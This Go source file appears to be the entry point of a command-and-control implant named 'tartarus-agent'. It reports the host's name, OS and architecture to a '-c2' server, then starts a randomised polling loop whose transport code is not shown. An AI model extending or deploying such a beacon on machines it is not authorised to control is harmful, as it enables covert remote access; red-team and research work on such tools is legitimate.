package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"runtime"
	"tartarus-agent/config"
	"tartarus-agent/transport"
)

type AgentRegistration struct {
	AgentID      string `json:"agent_id"`
	Hostname     string `json:"hostname"`
	OS           string `json:"os"`
	Architecture string `json:"architecture"`
}

func registerAgent(baseURL string, agentID string) error {
	hostname, err := os.Hostname()
	if err != nil {
		return err
	}

	agent := AgentRegistration{
		AgentID:      agentID,
		Hostname:     hostname,
		OS:           runtime.GOOS,
		Architecture: runtime.GOARCH,
	}

	data, err := json.Marshal(agent)
	if err != nil {
		return err
	}

	resp, err := http.Post(
		baseURL+"/agents/register",
		"application/json",
		bytes.NewBuffer(data),
	)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return fmt.Errorf("registration failed: HTTP %d", resp.StatusCode)
	}

	log.Printf("[TARTARUS-AGENT] Registration successful")

	return nil
}

func main() {
	agentID := flag.String(
		"agent-id",
		"",
		"Agent UUID from backend registration",
	)

	c2URL := flag.String(
		"c2",
		"http://localhost:8000",
		"Management server URL",
	)

	privKey := flag.String(
		"privkey",
		"agent_private.pem",
		"Path to RSA private key PEM",
	)

	flag.Parse()

	if *agentID == "" {
		log.Fatal("--agent-id required")
	}

	_ = config.AgentConfig{
		AgentID:     *agentID,
		C2BaseURL:   *c2URL,
		PrivKeyPath: *privKey,
		PollMin:     2,
		PollMax:     5,
	}

	log.Printf("[TARTARUS-AGENT] Starting...")
	log.Printf("[TARTARUS-AGENT] AgentID=%s", *agentID)

	err := registerAgent(*c2URL, *agentID)
	if err != nil {
		log.Fatalf("[TARTARUS-AGENT] Registration failed: %v", err)
	}

	log.Printf("[TARTARUS-AGENT] Agent is ready")
	transport.StartPollLoop(config.AgentConfig{
		AgentID:     *agentID,
		C2BaseURL:   *c2URL,
		PrivKeyPath: *privKey,
		PollMin:     2,
		PollMax:     5,
	})
}
